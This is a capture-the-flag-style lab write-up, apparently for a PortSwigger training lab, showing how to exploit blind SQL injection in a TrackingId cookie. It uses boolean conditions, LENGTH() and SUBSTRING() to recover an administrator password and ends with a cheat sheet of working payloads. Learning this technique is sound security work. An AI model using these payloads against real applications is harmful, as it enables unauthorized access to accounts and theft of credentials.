# Blind SQL Injection with Conditional Responses


**Lab:** Blind SQL injection with conditional responses

**Difficulty:** Practitioner

**Status:** Solved ✅



## 🎯 Goal



Exploit a **blind SQL injection** vulnerability to determine the password of the `administrator` user and log in.



---



## 1. Vulnerability



The SQL injection is in the **`TrackingId` cookie**.



The application does **not** return the SQL query results or error messages.



However, it displays:



```text

Welcome back

```




when the SQL query returns at least one row.



So we can use this as a **TRUE/FALSE indicator**.



---




## 2. Test TRUE and FALSE Conditions




### TRUE:



```sql

' AND '1'='1

```



→ `Welcome back` appears ✅



### FALSE:



```sql

' AND '1'='2

```



→ `Welcome back` does not appear ❌



Therefore:




```text

TRUE  → Welcome back

FALSE → No Welcome back


```



This allows us to ask the database questions without directly seeing its results.



---




## 3. Confirm the Administrator User



We can test whether `administrator` exists:




```sql

' AND (SELECT 'x' FROM users WHERE username='administrator')='x

```



If `Welcome back` appears, the condition is TRUE and the user exists.



---



## 4. Find the Password Length



Use `LENGTH()` to test the password length:



```sql

' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 5--

```



Change the number until the condition becomes FALSE.




In this lab:



```text

Password length = 20

```

---


## 5. Extract the Password




Use `SUBSTRING()` to test individual characters.


Example: test whether the first character is `a`:


```sql

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

```



If `Welcome back` appears:



```text

The first character = a

```


Then repeat for each position:



```text

1 → first character
2 → second character
3 → third character

...

20 → twentieth character

```



You can automate the character testing with **Burp Intruder**.



---


## 🧠 Key Concept


Blind SQL injection works by converting database information into **observable TRUE/FALSE responses**.



```text

SQL Query

   ↓

TRUE / FALSE

   ↓

Different application response

   ↓

Infer database information

```



Unlike UNION SQL injection:



```text

UNION SQLi → directly retrieve data

Blind SQLi → infer data through conditions



```



---



## 🔑 Cheat Sheet



```sql

-- TRUE/FALSE test

' AND '1'='1

' AND '1'='2



-- Check user

' AND (SELECT 'x' FROM users WHERE username='administrator')='x



-- Find password length

' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 10--



-- Test a character

' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

```


### 🧩 Review Word: **Blindora**



**Blind + Oracle = Blindora**




[PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind?utm_source=chatgpt.com)
